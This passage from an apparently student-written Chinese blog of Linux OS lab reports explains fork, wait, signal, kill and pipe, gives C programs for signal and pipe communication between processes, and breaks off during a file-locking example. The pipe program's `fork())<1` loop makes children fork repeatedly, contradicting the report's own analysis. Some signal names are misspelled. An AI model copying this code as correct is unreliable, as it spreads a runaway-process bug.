<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570014004158.png"></li>
<li><p>调用fork函数，当控制转移到内核中的fork代码后，内核开始做如下工作：</p>
<ol>
<li>分配新的内存块和内核数据结构给子进程；</li>
<li>将父进程部分数据结构内容拷贝至子进程；</li>
<li>将子进程添加到系统进程列表；</li>
<li>fork返回开始调度器，调度。</li>
</ol>
</li>
<li><p>调用fork函数返回值的三种情况：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fork</span><span class="params">()</span>; </span><br><span class="line">pid = fork(); </span><br><span class="line"><span class="keyword">if</span>(pid &lt; <span class="number">0</span>) &#123;		<span class="comment">//错误</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;fork error\n&quot;</span>);                         </span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(pid == <span class="number">0</span>) &#123; 		<span class="comment">//子进程</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The child process is running now!\n&quot;</span>); </span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;				</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(pid &gt; <span class="number">0</span>) &#123;		<span class="comment">//父进程</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The parent process is running now!\n&quot;</span>); </span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125; 			</span><br></pre></td></tr></table></figure>

<ol>
<li><code>pid &lt; 0 </code>，运行错误；</li>
<li><code>pid &gt; 0 </code>，运行父进程；</li>
<li><code>pid = 0 </code>，运行子进程。</li>
</ol>
</li>
</ul>
<h3 id="wait函数"><a href="#wait函数" class="headerlink" title="wait函数"></a>wait函数</h3><ul>
<li><p>函数原型：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span>		<span class="comment">/*提供类型pid_t的定义*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;wait.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">wait</span><span class="params">(<span class="type">int</span> *status)</span></span><br></pre></td></tr></table></figure></li>
<li><p>函数功能：父进程一旦调用了wait函数就立即阻塞自己，由wait自动分析是否当前进程的某个子进程已经退出，如果让它找到了这样一个已经变成僵尸的子进程，wait就会收集这个子进程的信息，并把它彻底销毁后返回；如果没有找到这样一个子进程，wait就会一直阻塞在这里，直到有一个出现为止。</p>
</li>
<li><p>备注：</p>
<ul>
<li><p>当父进程忘了用wait函数等待已终止的子进程时，子进程就会进入一种无父进程的状态，此时子进程就是僵尸进程；</p>
</li>
<li><p>wait()要与fork()配套出现，如果在使用fork()之前调用wait()，wait()的返回值则为-1，正常情况下wait()的返回值为子进程的PID；</p>
</li>
<li><p>如果先终止父进程，子进程将继续正常进行，只是它将由init进程(PID 1)继承，当子进程终止时，init进程捕获这个状态；</p>
</li>
<li><p>参数status用来保存被收集进程退出时的一些状态，它是一个指向int类型的指针。但如果我们对这个子进程是如何死掉毫不在意，只想把这个僵尸进程消灭掉，我们就可以设定这个参数为NULL，就像下面这样：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pid = wait(<span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure></li>
<li><p>如果成功，wait会返回被收集的子进程的进程ID，如果调用进程没有子进程，调用就会失败，此时wait返回-1，同时errno被置为ECHILD。</p>
</li>
<li><p>如果参数status的值不是NULL，wait就会把子进程退出时的状态取出并存入其中，<br>这是一个整数值（int），指出子进程是正常退出还是被非正常结束的，以及正常结束时的返回值，或被哪一个信号结束的等信息。由于这些信息被存放在一个整数的不同二进制位中，所以用常规的方法读取会非常麻烦，因此设计了一套专门的宏（macro）来完成这项工作，其中最常用的两个如下：</p>
<ol>
<li><p><code>WIFEXITED(status)</code><br>这个宏用来指出子进程是否为正常退出的，如果是，它会返回一个非零值。</p>
</li>
<li><p><code>WEXITSTATUS(status)</code> </p>
<p>当WIFEXITED返回非零值时，我们可以用这个宏来提取子进程的返回值，如果子进程调用exit(5)退出，WEXITSTATUS(status)就会返回5；如果子进程调用exit(7)，WEXITSTATUS(status)就会返回7。如果进程不是正常退出的，也就是说，<br>WIFEXITED返回0，这个值就毫无意义。</p>
</li>
</ol>
</li>
</ul>
</li>
</ul>
<h3 id="exit函数"><a href="#exit函数" class="headerlink" title="exit函数"></a>exit函数</h3><p>进程结束最常用函数，表示正常结束；</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">exit</span><span class="params">(<span class="type">int</span> status)</span>;</span><br></pre></td></tr></table></figure>

<h3 id="kill函数"><a href="#kill函数" class="headerlink" title="kill函数"></a>kill函数</h3><p>删除执行中的程序和任务，异常结束；</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kill(<span class="type">int</span> PID,<span class="type">int</span> IID);</span><br></pre></td></tr></table></figure>

<h3 id="signal函数"><a href="#signal函数" class="headerlink" title="signal函数"></a>signal函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span>(* signal(<span class="type">int</span> sig, <span class="type">void</span>(* func)(<span class="type">int</span>)))(<span class="type">int</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li><p>设置处理信号的功能指定使用sig指定的<em>信号编号</em>处理信号的方法。 参数func指定程序可以处理信号的三种方式之一：</p>
<ol>
<li>默认处理(SIG_DFL)：信号由该特定信号的默认动作处理；</li>
<li>忽略信号(SIG_IGN)：忽略信号，即使没有意义，代码执行仍将继续；</li>
<li>函数处理程序：定义一个特定的函数来处理信号</li>
</ol>
</li>
<li><p>参数</p>
<ul>
<li><p><code>SIG</code></p>
<p>设置处理功能的信号值；</p>
</li>
<li><p><code>FUNC</code></p>
<p>指向函数的指针；</p>
</li>
<li><p>返回值</p>
<p>返回类型与参数func的类型相同。</p>
</li>
</ul>
</li>
<li><p>常用的signal</p>
<table>
<thead>
<tr>
<th>信号</th>
<th>功能</th>
<th>值</th>
</tr>
</thead>
<tbody><tr>
<td>SIGNHUP</td>
<td>挂起</td>
<td>1</td>
</tr>
<tr>
<td>SIGINT</td>
<td>键盘中断，键盘按<code>Ctrl+C</code></td>
<td>2</td>
</tr>
<tr>
<td>SIGQUIT</td>
<td>键盘按<code>QUIT</code></td>
<td>3</td>
</tr>
<tr>
<td>SIGILL</td>
<td>非法指令</td>
<td>4</td>
</tr>
<tr>
<td>SIGTRAP</td>
<td>跟踪中断</td>
<td>5</td>
</tr>
<tr>
<td>SIGIOT</td>
<td>IOT指令</td>
<td>6</td>
</tr>
<tr>
<td>SIGBUS</td>
<td>总线错</td>
<td>7</td>
</tr>
<tr>
<td>SIGFPE</td>
<td>浮点运算溢出</td>
<td>8</td>
</tr>
<tr>
<td>SIGKILL</td>
<td>要求终止进程</td>
<td>9</td>
</tr>
<tr>
<td>SIGUSR1</td>
<td>用户定义信号#1</td>
<td>10</td>
</tr>
<tr>
<td>SIGSEGV</td>
<td>段违法</td>
<td>11</td>
</tr>
<tr>
<td>SIGUSR2</td>
<td>用户定义信号#2</td>
<td>12</td>
</tr>
<tr>
<td>SIGPIPE</td>
<td>向没有读进程的管道上写</td>
<td>13</td>
</tr>
<tr>
<td>SIGALRM</td>
<td>定时器告警，时间到</td>
<td>14</td>
</tr>
<tr>
<td>SIGTERM</td>
<td>kill发出的软件结束信号</td>
<td>15</td>
</tr>
<tr>
<td>SIGSTKFLT</td>
<td>Linux专用，数学协处理器的栈异常</td>
<td>16</td>
</tr>
<tr>
<td>SIGCHLD</td>
<td>子进程死</td>
<td>17</td>
</tr>
<tr>
<td>SIGCOUNT</td>
<td>若已停止则继续</td>
<td>18</td>
</tr>
<tr>
<td>SIGPWR</td>
<td>电源故障</td>
<td>30</td>
</tr>
</tbody></table>
</li>
</ul>
<h3 id="pipe函数"><a href="#pipe函数" class="headerlink" title="pipe函数"></a>pipe函数</h3><p>管道是一种把两个进程之间的标准输入和标准输出连接起来的机制，从而提供一种让多个进程间通信的方法，当进程创建管道时，每次都需要提供两个文件描述符来操作管道。其中一个对管道进行写操作，另一个对管道进行读操作。对管道的读写与一般的IO系统函数一致，使用write()函数写入数据，使用read()读出数据。</p>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570038016574.png">

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pipe</span><span class="params">(<span class="type">int</span> filedes[<span class="number">2</span>])</span>;</span><br></pre></td></tr></table></figure>

<p>返回值：成功，返回0，否则返回-1。</p>
<p>参数数组包含pipe使用的两个文件的描述符。</p>
<ul>
<li>fd[0]:读管道；</li>
<li>fd[1]:写管道；</li>
<li>fd[2]:提供进程使用的文件描述符数组。</li>
</ul>
<p>必须在fork()中调用pipe()，否则子进程不会继承文件描述符。两个进程不共享祖先进程，就不能使用pipe。</p>
<h2 id="编制实现软中断通信的程序"><a href="#编制实现软中断通信的程序" class="headerlink" title="编制实现软中断通信的程序"></a>编制实现软中断通信的程序</h2><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>使用系统调用fork()创建两个子进程，再用系统调用signal()让父进程捕捉键盘上来的中断信号（即按Ctrl+c键），当父进程接受到这两个软中断的其中某一个后，父进程用系统调用kill()向两个子进程分别发送整数值为16和17软中断信号，子进程获得对应软中断信号后，分别输出下列信息后终止：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Child process <span class="number">1</span> is killed by parent !!</span><br><span class="line">Child process <span class="number">2</span> is killed by parent !!</span><br></pre></td></tr></table></figure>

<p>父进程调用wait()函数等待两个子进程终止后，输出以下信息后终止：                                                         </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Parent process is killed!! </span><br></pre></td></tr></table></figure>

<h3 id="程序流程图"><a href="#程序流程图" class="headerlink" title="程序流程图"></a>程序流程图</h3><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570080291071.png" width="75%" height="75%">

<h3 id="程序源代码"><a href="#程序源代码" class="headerlink" title="程序源代码"></a>程序源代码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">waiting</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">stop</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> wait_mark;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">int</span> p1,p2;						<span class="comment">/*定义两个进程号变量*/</span></span><br><span class="line">   <span class="keyword">while</span>((p1=fork())&lt;<span class="number">0</span>);			<span class="comment">/*创建子进程p1*/</span></span><br><span class="line">   <span class="keyword">if</span>(p1&gt;<span class="number">0</span>)&#123;</span><br><span class="line">       <span class="keyword">while</span>((p2=fork())&lt;<span class="number">0</span>);		<span class="comment">/*创建子进程p2*/</span></span><br><span class="line">       <span class="keyword">if</span>(p2&gt;<span class="number">0</span>)&#123;</span><br><span class="line">           <span class="built_in">printf</span>(<span class="string">&quot;Father PID:%d\n&quot;</span>,getpid());</span><br><span class="line">           wait_mark=<span class="number">1</span>;				<span class="comment">/*不往下执行，直到捕捉到键盘上传来的信号*/</span></span><br><span class="line">           signal(SIGINT,stop);		<span class="comment">/*接收到^c信号，转stop*/</span></span><br><span class="line">           waiting();</span><br><span class="line">           kill(p1,<span class="number">16</span>);				<span class="comment">/*向p1发软中断信号16*/</span></span><br><span class="line">           kill(p2,<span class="number">17</span>);				<span class="comment">/*向p2发软中断信号17*/</span></span><br><span class="line">           wait(<span class="number">0</span>);					<span class="comment">/*同步*/</span></span><br><span class="line">           wait(<span class="number">0</span>);</span><br><span class="line">           <span class="built_in">printf</span>(<span class="string">&quot;Parent process is killed!\n&quot;</span>);</span><br><span class="line">           <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="built_in">printf</span>(<span class="string">&quot;Child2 PID:%d\n&quot;</span>,getpid());</span><br><span class="line">           wait_mark=<span class="number">1</span>;</span><br><span class="line">           signal(<span class="number">17</span>,stop);			<span class="comment">/*接收到软中断信号17，转stop*/</span></span><br><span class="line">           signal(SIGINT,SIG_IGN);	<span class="comment">/*屏蔽从键盘上传来的中断信号，使得子进程可以接收到父进程传来的软中断信号*/</span></span><br><span class="line">           waiting();				<span class="comment">/*不往下执行*/</span></span><br><span class="line">           lockf(<span class="built_in">stdout</span>,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">           <span class="built_in">printf</span>(<span class="string">&quot;Child process 2 is killed by parent!\n&quot;</span>);</span><br><span class="line">           lockf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">           <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span>&#123;</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;Child1 PID:%d\n&quot;</span>,getpid());</span><br><span class="line">       wait_mark=<span class="number">1</span>;</span><br><span class="line">       signal(<span class="number">16</span>,stop);				<span class="comment">/*接收到软中断信号16，转stop*/</span></span><br><span class="line">       signal(SIGINT,SIG_IGN);		<span class="comment">/*屏蔽从键盘上传来的中断信号，使得子进程可以接收到父进程传来的软中断信号*/</span></span><br><span class="line">       waiting();					<span class="comment">/*不往下执行*/</span></span><br><span class="line">       lockf(<span class="built_in">stdout</span>,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;Child process 1 is killed by parent!\n&quot;</span>);</span><br><span class="line">       lockf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">       <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">waiting</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(wait_mark!=<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">stop</span><span class="params">()</span>&#123;</span><br><span class="line">	wait_mark=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="程序运行结果"><a href="#程序运行结果" class="headerlink" title="程序运行结果"></a>程序运行结果</h3><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570071904980.png">

<h3 id="运行结果分析"><a href="#运行结果分析" class="headerlink" title="运行结果分析"></a>运行结果分析</h3><p>​        程序运行两次，软中断后，结果输出顺序不相同。理论上，父程序在同一时间下达指令，软中断子程序1和子程序2并发执行，并发执行并不是同时执行，而可能是交叉执行，两个子程序执行完成时间不一致，即第一次运行程序2先完成，第二次运行程序1先完成。</p>
<h2 id="编制实现进程的管道通信的程序"><a href="#编制实现进程的管道通信的程序" class="headerlink" title="编制实现进程的管道通信的程序"></a>编制实现进程的管道通信的程序</h2><h3 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h3><p>使用系统调用pipe()建立一条管道线，两个子进程分别向管道写一句话：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Child process <span class="number">1</span> is sending a message!  </span><br><span class="line">Child process <span class="number">2</span> is sending a message!  </span><br></pre></td></tr></table></figure>

<p>父进程从管道中先后读出来自于两个子进程p1、p2的消息，显示在屏幕上。</p>
<h3 id="程序流程图-1"><a href="#程序流程图-1" class="headerlink" title="程序流程图"></a>程序流程图</h3><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570080232148.png" width="50%" height="50%">

<h3 id="程序源代码-1"><a href="#程序源代码-1" class="headerlink" title="程序源代码"></a>程序源代码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> pid1,pid2;						<span class="comment">/*定义两个进程号变量*/</span></span><br><span class="line"> </span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Father PID:%d\n&quot;</span>,getpid());</span><br><span class="line">    <span class="type">int</span> fd[<span class="number">2</span>];</span><br><span class="line">    <span class="type">char</span> outpipe[<span class="number">100</span>],inpipe[<span class="number">100</span>];	<span class="comment">/*定义两个字符数组*/</span></span><br><span class="line">    pipe(fd);						<span class="comment">/*创建一个管道*/</span></span><br><span class="line">    <span class="keyword">while</span> ((pid1=fork())&lt;<span class="number">0</span>);		<span class="comment">/*如果进程1创建不成功,则空循环*/</span></span><br><span class="line">    <span class="keyword">if</span>(pid1==<span class="number">0</span>)&#123;					<span class="comment">/*如果子进程1创建成功,pid1为进程号*/</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Child1 PID:%d\n&quot;</span>,getpid());</span><br><span class="line">        lockf(fd[<span class="number">1</span>],<span class="number">1</span>,<span class="number">0</span>);			<span class="comment">/*锁定管道*/</span></span><br><span class="line">        <span class="built_in">sprintf</span>(outpipe,<span class="string">&quot;child 1 process is sending message!&quot;</span>);		<span class="comment">/*把串放入数组outpipe中*/</span></span><br><span class="line">        write(fd[<span class="number">1</span>],outpipe,<span class="number">50</span>);    <span class="comment">/*向管道写长为50字节的串*/</span></span><br><span class="line">        lockf(fd[<span class="number">1</span>],<span class="number">0</span>,<span class="number">0</span>);			<span class="comment">/*解除管道的锁定*/</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);					<span class="comment">/*结束进程1*/</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">while</span> ((pid2=fork())&lt;<span class="number">1</span>);	<span class="comment">/*若进程2创建不成功,则空循环*/</span></span><br><span class="line">        <span class="keyword">if</span>(pid2==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Child2 PID:%d\n&quot;</span>,getpid());</span><br><span class="line">            lockf(fd[<span class="number">1</span>],<span class="number">1</span>,<span class="number">0</span>);       <span class="comment">/*锁定管道*/</span></span><br><span class="line">            <span class="built_in">sprintf</span>(outpipe,<span class="string">&quot;child 2 process is sending message!&quot;</span>);</span><br><span class="line">            write(fd[<span class="number">1</span>],outpipe,<span class="number">50</span>);</span><br><span class="line">            lockf(fd[<span class="number">1</span>],<span class="number">0</span>,<span class="number">0</span>);		<span class="comment">/*解除管道的锁定*/</span></span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);				<span class="comment">/*结束进程2*/</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            wait(<span class="number">0</span>);                <span class="comment">/*同步，等待子进程1结束*/</span></span><br><span class="line">            read(fd[<span class="number">0</span>],inpipe,<span class="number">50</span>);  <span class="comment">/*从管道中读长为50字节的串*/</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,inpipe);	<span class="comment">/*显示读出的数据*/</span></span><br><span class="line">            wait(<span class="number">0</span>);				<span class="comment">/*同步，等待子进程2结束*/</span></span><br><span class="line">            read(fd[<span class="number">0</span>],inpipe,<span class="number">50</span>);  <span class="comment">/*从管道中读长为50字节的串*/</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,inpipe);	<span class="comment">/*显示读出的数据*/</span></span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);				<span class="comment">/*结束父进程*/</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="程序运行结果-1"><a href="#程序运行结果-1" class="headerlink" title="程序运行结果"></a>程序运行结果</h3><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570078674032.png">

<h3 id="运行结果分析-1"><a href="#运行结果分析-1" class="headerlink" title="运行结果分析"></a>运行结果分析</h3><p>根据对源代码的注释分析，父进程必须先接收子程序1的消息，再接收子程序2的消息。因此必须先创建成功子程序1，再创建子程序2，这里用到了两个while()循环如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ((pid1=fork())&lt;<span class="number">0</span>);		<span class="comment">/*如果进程1创建不成功,则空循环*/</span></span><br><span class="line"><span class="keyword">while</span> ((pid2=fork())&lt;<span class="number">0</span>);		<span class="comment">/*如果进程2创建不成功,则空循环*/</span></span><br></pre></td></tr></table></figure>

<p>因此会先打印出子程序1的PID和消息，再打印子程序2的PID和消息。</p>
<h1 id="实验难点与收获"><a href="#实验难点与收获" class="headerlink" title="实验难点与收获"></a>实验难点与收获</h1><h2 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h2><ol>
<li>对并发执行的理解；</li>
<li>对管道通信过程的学习等；</li>
</ol>
<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ol>
<li>学习了进程管理的相关函数如fork()、wait()、kill()、signal()、pipe()等的使用；</li>
<li>知道了并发执行并不是同一时间执行两个程序，对并发有了更确切的理解；</li>
<li>深入理解了进程互斥的概念；</li>
<li>了解了Linux系统中进程通信的基本原理等；</li>
</ol>
<h1 id="实验思考"><a href="#实验思考" class="headerlink" title="实验思考"></a>实验思考</h1><p>通过这次实验，我对操作系统进程管理的内容有了更深入的理解。在linx操作系统中，进程的创建需要调用fork函数，该函数调用一次，返回两次。深入理解了进程互斥的概念，即两个或两个以上的进程,不能同时进入关于同一组共享变量的临界区域。进程互斥通过lockf()来实现。通过kill()函数和signal()函数深入理解进程的之间的软中断。前者是发送软中断信号，后者是接收软中断信号。通过pipe()函数理解进程之间的管道通信。</p>
]]></content>
      <categories>
        <category>操作系统内核实验</category>
      </categories>
      <tags>
        <tag>Linux进程管理</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统内核 实验五</title>
    <url>/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8-%E5%AE%9E%E9%AA%8C%E4%BA%94.html</url>
    <content><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ol>
<li>了解进程如何让在 Linux 中彼此同步；</li>
<li>理解 C 语言代码所阐述的文件共享、内存共享、管道通信、信号量互斥、队列通信等 IPC 机制；</li>
<li>运行实验代码理解代码执行过程；</li>
<li>实现内核和用户程序之间的文件通信； </li>
</ol>
<span id="more"></span>

<h1 id="实验基本概念"><a href="#实验基本概念" class="headerlink" title="实验基本概念"></a>实验基本概念</h1><ol>
<li> 进程是运行着的程序，每个进程都有着它自己的地址空间，这些空间由进程被允许访问的内存地址组成。进程有一个或多个执行线程，而线程是一系列执行指令的集合：单线程进程就只有一个线程，而多线程的进程则有多个线程。一个进程中的线程共享各种资源，特别是地址空间。另外，一个进程中的线程可以直接通过共享内存来进行通信。</li>
<li> 有多种方法启动之后要进行通信的进程，但主要有两种方式：一种是一个终端被用来启动一个进程，另一个不同的终端被用来启动另一个；另一种是在一个进程（父进程）中调用系统函数 fork，以此启动另一个进程（子进程）。</li>
</ol>
<h1 id="理解实验原理和代码"><a href="#理解实验原理和代码" class="headerlink" title="理解实验原理和代码"></a>理解实验原理和代码</h1><h2 id="文件共享-producer-consumer"><a href="#文件共享-producer-consumer" class="headerlink" title="文件共享 ./producer ./consumer"></a>文件共享 <code>./producer ./consumer</code></h2><ol>
<li><p>文件共享是最基础的进程间通信<code>IPC</code>机制。实验所给的代码中考虑了一个相对简单的例子，其中一个进程(生产者producer)创建和写入一个文件，然后另一个进程(消费者consumer)从这个相同的文件中进行读取。在使用这个IPC机制时，生产者和消费者可能恰好在同一时间访问该文<br>件，从而使得输出结果不确定。为了避免竞争条件的发生，该文件在处于读或写状态时必须以某种方式处于被锁状态，从而阻止在写操作执行时和其他操作的冲突。</p>
</li>
<li><p><strong>解决办法</strong>：生产者在写入文件时获得一个文件的排斥锁。一个排斥锁最多被一个进程所拥有。这样就可以排除掉竞争条件的发生，因为在锁被释放之前没有其他的进程可以访问这个文件； 消费者在从文件中读取内容时得到至少一个共享锁。多个读取者可以同时保有一个共享锁，但是没有写入者可以获取到文件内容，甚至在当只有一个读取者保有一个共享锁时。标准的 I/O 库中包含了一个名为 fcntl 的实用函数，它可以被用来检查或者操作一个文件上的排斥锁和共享锁。 </p>
</li>
<li><p><code>producer.c</code>程序分析：首先声明了一个类型为<code>struct flock</code>的变量，它代表一个锁，对 <code>l_type</code>的初始化，使得这个锁是排斥锁而不是一个共享锁，假如生产者获得该锁，则其他进程不能对文件进行读写操作，直到生产者释放该锁或者显式地调用<code>fcntl</code>，又或者隐式地关闭这个文件。当进程终止时，所有被它打开的文件都会被自动关闭，从而释放了锁。接着初始化其他的域。主要的效果是整个文件都将被锁上。然后调用<code>fcntl</code>尝试排斥性地将文件锁住，并检查调用是否成功。如果生产者获得了锁，则程序向文件中写入<code>DataString</code>，然后改变锁的结构为<code>F_UNLCK</code>，调用<code>fcntl</code>执行解锁操作，最后关闭文件并退出。 </p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FileName <span class="string">&quot;data.dat&quot;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">report_and_exit</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">perror</span>(msg);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>); <span class="comment">/* EXIT_FAILURE */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">flock</span> lock;</span><br><span class="line">  lock.l_type = F_WRLCK;   <span class="comment">//读/写(独占对共享)锁</span></span><br><span class="line">  lock.l_whence = SEEK_SET;<span class="comment">//寻求偏移基址</span></span><br><span class="line">  lock.l_start = <span class="number">0</span>;        <span class="comment">//文件中的第1字节</span></span><br><span class="line">  lock.l_len = <span class="number">0</span>;          <span class="comment">//0意味着&#x27;until EOF&#x27;</span></span><br><span class="line">  lock.l_pid = <span class="built_in">getpid</span>();   <span class="comment">//进程id</span></span><br><span class="line">  </span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">//文件描述符，用于标识进程中的文件</span></span><br><span class="line">  <span class="keyword">if</span> ((fd = <span class="built_in">open</span>(FileName, O_RDWR | O_CREAT, <span class="number">0666</span>)) &lt; <span class="number">0</span>)  <span class="comment">//-1标志着错误</span></span><br><span class="line">    <span class="built_in">report_and_exit</span>(<span class="string">&quot;open failed...&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">fcntl</span>(fd, F_SETLK, &amp;lock) &lt; <span class="number">0</span>) <span class="comment">//F_SETLK 没有阻塞, F_SETLKW 阻塞</span></span><br><span class="line">    <span class="built_in">report_and_exit</span>(<span class="string">&quot;fcntl failed to get lock...&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">write</span>(fd, DataString, <span class="built_in">strlen</span>(DataString)); <span class="comment">//填充数据文件</span></span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Process %d has written to data file...\n&quot;</span>, lock.l_pid);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 开始释放锁 */</span></span><br><span class="line">  lock.l_type = F_UNLCK;</span><br><span class="line">  <span 